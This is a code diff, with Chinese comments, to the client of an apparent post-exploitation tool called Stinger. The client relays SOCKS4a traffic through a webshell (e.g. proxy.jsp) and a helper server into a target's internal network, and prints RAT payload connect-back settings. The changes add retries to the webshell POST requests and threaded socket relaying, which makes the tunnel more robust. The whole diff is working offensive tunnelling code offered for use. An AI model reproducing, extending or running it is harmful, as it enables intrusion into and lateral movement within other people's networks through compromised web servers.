@@ -11,6 +11,7 @@ import struct
 import threading
 import time
 from socket import AF_INET, SOCK_STREAM
+from threading import Thread
 
 import ipaddr
 
@@ -48,11 +49,13 @@ class ClientCenter(threading.Thread):
         # socket参数
         self.LOCAL_ADDR = None
         self.READ_BUFF_SIZE = 11200
+        self.POST_RETRY_COUNT = 10  # post请求重试最大次数
+
         # 日志参数
         self.LOG_LEVEL = "INFO"
         self.logger = get_logger(level=self.LOG_LEVEL, name="StreamLogger")
-        # webshell参数
 
+        # webshell参数
         self.WEBSHELL = None
         self.REMOTE_SERVER = None
         self.SINGLE_MODE = False
@@ -67,6 +70,10 @@ class ClientCenter(threading.Thread):
         self.mirror_die_client_address = []
         self.session = requests.session()
         self.session.verify = False
+
+        # 多线程变量
+        self.post_send_data = {}
+        self.post_return_data = {}
         threading.Thread.__init__(self)
 
     def custom_header(self, inputstr):
@@ -92,32 +99,93 @@ class ClientCenter(threading.Thread):
         self.logger.info("\n")
         return True
 
+    def recv_socks_data(self, client_address):
+        """socks数据接收"""
+        client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
+        try:
+            tcp_recv_data = client_socket_conn.recv(self.READ_BUFF_SIZE)
+            self.logger.debug("CLIENT_ADDRESS:{} TCP_RECV_DATA:{}".format(client_address, tcp_recv_data))
+            if len(tcp_recv_data) > 0:
+                has_data = True
+                self.logger.info("CLIENT_ADDRESS:{} TCP_RECV_LEN:{}".format(client_address, len(tcp_recv_data)))
+
+        except Exception as err:
+            tcp_recv_data = b""
+            self.logger.debug("TCP_RECV_NONE")
+
+        # 编码问题,data数据(tcp传输的数据)需要额外再base64编码一次
+        client_socket_targetaddr = self.CACHE_CONNS.get(client_address).get("targetaddr")
+
+        # 每一个client_address的数据结构体
+        client_address_one_data = {
+            "data": base64.b64encode(tcp_recv_data),
+            "targetaddr": client_socket_targetaddr,
+        }
+        self.post_send_data[client_address] = client_address_one_data
+
+    def send_socks_data(self, client_address):
+        # 将返回的数据发送到client Tcp连接中
+        # 读取server返回的数据
+        try:
+            client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
+            server_tcp_send_data = base64.b64decode(self.post_return_data.get(client_address).get("data"))
+        except Exception as E:
+            if self.SINGLE_MODE is True:
+                self.logger.warning(
+                    "CLIENT_ADDRESS:{} server socket not in client socket list".format(client_address))
+                self.logger.warning("SINGLE_MODE: {} ,remove is conn from server".format(self.SINGLE_MODE))
+                self.die_client_address.append(client_address)
+            return
+
+        if server_tcp_send_data == "":  # 无数据返回继续下一个连接
+            return
+
+        # 将返回的数据发送到client Tcp连接中
+        try:
+            client_socket_conn.send(server_tcp_send_data)
+            self.logger.debug("CLIENT_ADDRESS:{} TCP_SEND_DATA:{}".format(client_address, server_tcp_send_data))
+        except Exception as E:
+            self.logger.warning("CLIENT_ADDRESS:{} Client socket send failed".format(client_address))
+            self.die_client_address.append(client_address)
+            try:
+                self.CACHE_CONNS.pop(client_address)
+                client_socket_conn.close()
+            except Exception as E:
+                pass
+
     def _post_data(self, url, data={}):
+        """发送数据到webshell"""
         payload = {
             "Remoteserver": self.REMOTE_SERVER,
             "Endpoint": url,
             "SENDDATA": diyEncode(data)
         }
         self.logger.debug(payload)
-        try:
-            # timeout 要大于脚本中post的超时时间
-            r = self.session.post(self.WEBSHELL, data=payload, verify=False, timeout=15, headers=self.headers)
-        except Exception as E:
-            self.logger.warning("Post data to WEBSHELL failed")
-            self.logger.exception(E)
-            return None
-        try:
-            web_return_data = diyDecode(r.content)
-            if isinstance(web_return_data, dict) and web_return_data.get(ERROR_CODE) is not None:
-                self.logger.error(web_return_data.get(ERROR_CODE))
-                self.logger.warning(r.content)
-                return None
-            else:
-                return web_return_data
-        except Exception as E:
-            self.logger.warning("WEBSHELL return wrong data")
-            self.logger.debug(r.content)
-            return None
+
+        for i in range(self.POST_RETRY_COUNT):
+            try:
+                # timeout 要大于脚本中post的超时时间
+                r = self.session.post(self.WEBSHELL, data=payload, verify=False, timeout=15, headers=self.headers)
+            except Exception as E:
+                self.logger.warning("Post data to WEBSHELL failed")
+                self.logger.exception(E)
+                time.sleep(3)  # 错误后延时
+                continue
+            try:
+                web_return_data = diyDecode(r.content)
+                if isinstance(web_return_data, dict) and web_return_data.get(ERROR_CODE) is not None:
+                    self.logger.error(web_return_data.get(ERROR_CODE))
+                    self.logger.warning(r.content)
+                    return None
+                else:
+                    return web_return_data
+            except Exception as E:
+                self.logger.warning("WEBSHELL return wrong data")
+                self.logger.debug(r.content)
+                time.sleep(3)  # 错误后延时
+                continue
+        # 超过重试次数后,退出
+        return None
 
     def run(self):
         self.logger.warning("LoopThread start")
@@ -137,28 +205,17 @@ class ClientCenter(threading.Thread):
                     "CLIENT_ADDRESS:{} close client close client in die_client_address error".format(client_address))
 
         # 从tcp中读取数据
-        post_send_data = {}
+        thread_list = []
+        self.post_send_data = {}
         for client_address in list(self.CACHE_CONNS.keys()):
-            client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
-            try:
-                tcp_recv_data = client_socket_conn.recv(self.READ_BUFF_SIZE)
-                self.logger.debug("CLIENT_ADDRESS:{} TCP_RECV_DATA:{}".format(client_address, tcp_recv_data))
-                if len(tcp_recv_data) > 0:
-                    has_data = True
-                    self.logger.info("CLIENT_ADDRESS:{} TCP_RECV_LEN:{}".format(client_address, len(tcp_recv_data)))
+            temp = Thread(target=self.recv_socks_data,
+                          args=(client_address,))
+            thread_list.append(temp)
 
-            except Exception as err:
-                tcp_recv_data = b""
-                self.logger.debug("TCP_RECV_NONE")
-            # 编码问题,data数据(tcp传输的数据)需要额外再base64编码一次
-            client_socket_targetaddr = self.CACHE_CONNS.get(client_address).get("targetaddr")
-
-            # 每一个client_address的数据结构体
-            client_address_one_data = {
-                "data": base64.b64encode(tcp_recv_data),
-                "targetaddr": client_socket_targetaddr,
-            }
-            post_send_data[client_address] = client_address_one_data
+        for temp in thread_list:
+            temp.start()
+        for temp in thread_list:
+            temp.join()
 
         # 从tcp中读取数据(mirror)
         mirror_post_send_data = {}
@@ -183,60 +240,34 @@ class ClientCenter(threading.Thread):
             }
             mirror_post_send_data[mirror_client_address] = client_address_one_data
 
-        # 发送读取的数据到服务器
-        # 发送读取的数据到服务器
-        # 发送读取的数据到服务器
+        # 组装数据
         payload = {}
-        payload[DATA_TAG] = post_send_data  # 发送的数据
+        payload[DATA_TAG] = self.post_send_data  # 发送的数据
         payload[DIE_CLIENT_ADDRESS_TAG] = self.die_client_address  # 需要清除的连接
         payload[MIRROR_DATA_TAG] = mirror_post_send_data  # 发送的数据
         payload[MIRROR_DIE_CLIENT_ADDRESS_TAG] = self.mirror_die_client_address  # 需要清除的连接
-
+        # 发送读取的数据到webshell
         return_data = self._post_data(URL_STINGER_SYNC, data=payload)
-
-        if return_data is None:
-            time.sleep(3)
+        if return_data is None:  # 获取数据失败,退出此次同步
             return
 
         # 处理post返回数据
-        # 处理post返回数据
-        # 处理post返回数据
-        post_return_data = return_data.get(RETURN_DATA)
+        # 读取server返回的数据
+        self.post_return_data = return_data.get(RETURN_DATA)
         self.die_client_address = []
+        thread_list = []
 
-        for client_address in list(post_return_data.keys()):
-            # 读取server返回的数据
-            try:
-                client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
-                server_tcp_send_data = base64.b64decode(post_return_data.get(client_address).get("data"))
-            except Exception as E:
-                if self.SINGLE_MODE is True:
-                    self.logger.warning(
-                        "CLIENT_ADDRESS:{} server socket not in client socket list".format(client_address))
-                    self.logger.warning("SINGLE_MODE: {} ,remove is conn from server".format(self.SINGLE_MODE))
-                    self.die_client_address.append(client_address)
-                continue
-            # 将返回的数据发送到client Tcp连接中
-
-            if server_tcp_send_data == "":
-                # 无数据返回继续
-                continue
-
-            try:
-                client_socket_conn.send(server_tcp_send_data)
-                self.logger.debug("CLIENT_ADDRESS:{} TCP_SEND_DATA:{}".format(client_address, server_tcp_send_data))
-            except Exception as E:
-                self.logger.warning("CLIENT_ADDRESS:{} Client socket send failed".format(client_address))
-                self.die_client_address.append(client_address)
-                try:
-                    self.CACHE_CONNS.pop(client_address)
-                    client_socket_conn.close()
-                except Exception as E:
-                    pass
-
+        for client_address in list(self.post_return_data.keys()):
+            temp = Thread(target=self.send_socks_data,
+                          args=(client_address,))
+            thread_list.append(temp)
+        for temp in thread_list:
+            temp.start()
+        for temp in thread_list:
+            temp.join()
         # 检查没有在server返回列表中的client
         for client_address in list(self.CACHE_CONNS.keys()):
-            if post_return_data.get(client_address) is None:
+            if self.post_return_data.get(client_address) is None:
                 if self.CACHE_CONNS.get(client_address).get("new") is True:
                     self.CACHE_CONNS[client_address]["new"] = False
                     pass
@@ -246,7 +277,6 @@ class ClientCenter(threading.Thread):
                     )
                     self.logger.warning("CLIENT_ADDRESS:{} append in die_client_address".format(client_address))
                     self.die_client_address.append(client_address)
-
         # mirror处理
         mirror_post_return_data = return_data.get(MIRROR_RETURN_DATA)
         self.mirror_die_client_address = []
@@ -302,6 +332,8 @@ class ClientCenter(threading.Thread):
                 # self.mirror_die_client_address.append(mirror_client_address)
                 one = self.MIRROR_CHCHE_CONNS.pop(mirror_client_address)
                 one.get("conn").close()
+
+        # 等待时间
         if has_data:
             wait = 0
         else:
@@ -323,8 +355,8 @@ class ClientCenter(threading.Thread):
             self.logger.exception(E)
             return False
 
-    def setc_remoteserver(self, REMOTE_SERVER=None):
-        if REMOTE_SERVER is None:
+    def setc_remoteserver(self, remote_server=None):
+        if remote_server is None:
             for port in CONTROL_PORT:
                 for i in range(2):
                     self.REMOTE_SERVER = "http://{}:{}".format(LOCALADDR, port)
@@ -335,25 +367,7 @@ class ClientCenter(threading.Thread):
                     else:
                         return result
             return None
-        self.REMOTE_SERVER = REMOTE_SERVER
-        result = self._post_data(URL_CHECK)
-        if result is None:  # 失败回退
-            self.REMOTE_SERVER = None
-        return result
-
-    def gets_config(self, REMOTE_SERVER=None):
-        if REMOTE_SERVER is None:
-            for port in CONTROL_PORT:
-                for i in range(2):
-                    self.REMOTE_SERVER = "http://{}:{}".format(LOCALADDR, port)
-                    result = self._post_data(URL_CHECK)
-                    if result is None:  # 失败回退
-                        self.REMOTE_SERVER = None
-                        continue
-                    else:
-                        return result
-            return None
-        self.REMOTE_SERVER = REMOTE_SERVER
+        self.REMOTE_SERVER = remote_server
         result = self._post_data(URL_CHECK)
         if result is None:  # 失败回退
             self.REMOTE_SERVER = None
@@ -375,19 +389,6 @@ class ClientCenter(threading.Thread):
         payload = {CONFIG_TAG: tag, CONFIG_DATA: data}
         web_return_data = self._post_data(URL_CMD, payload)
         return web_return_data
-
-
-def build_socks_reply(cd, dst_port=0x0000, dst_ip='0.0.0.0'):
-    '''
-    Build a SOCKS4 reply with the specified reply code, destination port and
-    destination ip.
-    '''
-    # dst_ip_bytes = ipaddress.IPv4Address(dst_ip).packed
-    dst_ip_bytes = ipaddr.IPv4Address(dst_ip).packed
-
-    dst_ip_raw, = struct.unpack('>L', dst_ip_bytes)
-
-    return struct.pack('>BBHL', SERVER_VN, cd, dst_port, dst_ip_raw)
 
 
 class ClientRequest(object):
@@ -511,6 +512,19 @@ class Socks4aProxy(threading.Thread):
         self.logger = logging.getLogger("StreamLogger")
         threading.Thread.__init__(self)
 
+    @staticmethod
+    def build_socks_reply(cd, dst_port=0x0000, dst_ip='0.0.0.0'):
+        '''
+        Build a SOCKS4 reply with the specified reply code, destination port and
+        destination ip.
+        '''
+        # dst_ip_bytes = ipaddress.IPv4Address(dst_ip).packed
+        dst_ip_bytes = ipaddr.IPv4Address(dst_ip).packed
+
+        dst_ip_raw, = struct.unpack('>L', dst_ip_bytes)
+
+        return struct.pack('>BBHL', SERVER_VN, cd, dst_port, dst_ip_raw)
+
     def run(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -552,7 +566,7 @@ class Socks4aProxy(threading.Thread):
 
         # Handle invalid requests
         if client_request.isInvalid():
-            client_conn.send(build_socks_reply(RESPONSE_CD_REQUEST_REJECTED))
+            client_conn.send(self.build_socks_reply(RESPONSE_CD_REQUEST_REJECTED))
             client_conn.close()
             return
 
@@ -566,7 +580,7 @@ class Socks4aProxy(threading.Thread):
             }
 
             client_conn.settimeout(self._timeout)
-            client_conn.send(build_socks_reply(RESPONSE_CD_REQUEST_GRANTED))  # 处理完成,开始正式连接
+            client_conn.send(self.build_socks_reply(RESPONSE_CD_REQUEST_GRANTED))  # 处理完成,开始正式连接
         else:
             self.logger.warning("Socks4a do not support bind request")
 
@@ -574,7 +588,8 @@ class Socks4aProxy(threading.Thread):
 if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(
-        description="Make sure the stinger_server is running on webserver(stinger_server will listen 127.0.0.1:60010 127.0.0.1:60020)")
+        description="Make sure the stinger_server is running on webserver "
+                    "(stinger_server will listen 127.0.0.1:60010 127.0.0.1:60020)")
     parser.add_argument('-w', '--webshell', metavar='http://192.168.3.10:8080/proxy.jsp',
                         help="webshell url",
                         required=True)
@@ -600,7 +615,7 @@ if __name__ == '__main__':
     parser.add_argument('-st', '--sockettimeout', default=0.2,
                         metavar="N",
                         type=float,
-                        help="socket timeout value",
+                        help="socket timeout value,the biger the timeout, the slower the transmission speed",
                         )
     parser.add_argument('-ti', '--targetipaddress', metavar='127.0.0.1',
                         help="reverse proxy target ipaddress",
@@ -631,6 +646,7 @@ if __name__ == '__main__':
     else:
         CLEAN_SOCKET = False
 
+    # 处理header参数
     globalClientCenter = ClientCenter()
     header = args.header
     if header is not None:
@@ -638,13 +654,14 @@ if __name__ == '__main__':
         if flag is not True:
             sys.exit(1)
 
-
+    # 处理proxy参数
     proxy = args.proxy
     if proxy is not None:
         flag = globalClientCenter.custom_proxy(proxy)
         if flag is not True:
             sys.exit(1)
 
+    # 处理singlemode参数
     SINGLE_MODE = args.singlemode
     if SINGLE_MODE is not False:
         SINGLE_MODE = True
@@ -653,6 +670,7 @@ if __name__ == '__main__':
     else:
         SINGLE_MODE = False
 
+    # 本地端口检查
     globalClientCenter.logger.info("------------------- Local check -------------------")
     flag = globalClientCenter.setc_localaddr(LISTEN_ADDR, LISTEN_PORT)
     if flag:
@@ -663,6 +681,7 @@ if __name__ == '__main__':
         globalClientCenter.logger.error(WEBSHELL)
         sys.exit(1)
 
+    # 检查webshell是否可用
     webshell_alive = globalClientCenter.setc_webshell(WEBSHELL)
     if webshell_alive:
         globalClientCenter.logger.info("WEBSHELL check : pass")
@@ -672,6 +691,7 @@ if __name__ == '__main__':
         globalClientCenter.logger.error(WEBSHELL)
         sys.exit(1)
 
+    # 检查stinger_server是否可用
     result = globalClientCenter.setc_remoteserver()
     if result is None:
         globalClientCenter.logger.error("Read REMOTE_SERVER failed,please check whether server is running")
@@ -687,13 +707,14 @@ if __name__ == '__main__':
                 MIRROR_LISTEN = result.get(key)
         globalClientCenter.logger.info("\n")
 
-    globalClientCenter.logger.info("------------------- Set Sever Config -------------------")
+    globalClientCenter.logger.info("------------------- Set Server Config -------------------")
+
     # 是否清理已有连接
     if CLEAN_SOCKET:
         flag = globalClientCenter.send_cmd("CLEAN_SOCKET")
         globalClientCenter.logger.info("CLEAN_SOCKET cmd : {}".format(flag))
 
-    # server建立内网tcp连接的超时时间,超时时间越长速度越慢
+    # server建立内网tcp连接的超时时间
     sockettimeout = args.sockettimeout
     if sockettimeout != DEFAULT_SOCKET_TIMEOUT:
         flag = globalClientCenter.sets_config("SOCKET_TIMEOUT", sockettimeout)
@@ -723,17 +744,16 @@ if __name__ == '__main__':
         "Payload should connect to {}".format(MIRROR_LISTEN))
     globalClientCenter.logger.info("------------------! RAT Config !------------------\n")
 
-    # 启动服务
+    # 设置线程为守护线程
     globalClientCenter.setDaemon(True)
-
-    t2 = Socks4aProxy(host=args.locallistenaddress, port=args.locallistenport, timeout=sockettimeout, bufsize=BUFSIZE)
+    t2 = Socks4aProxy(host=args.locallistenaddress, port=args.locallistenport, timeout=sockettimeout)
     t2.setDaemon(True)
 
+    # 启动服务
     globalClientCenter.start()
     t2.start()
 
-    # 处理结束信号
-
+    # 保持程序运行,处理结束信号
     while True:
         try:
             time.sleep(10)
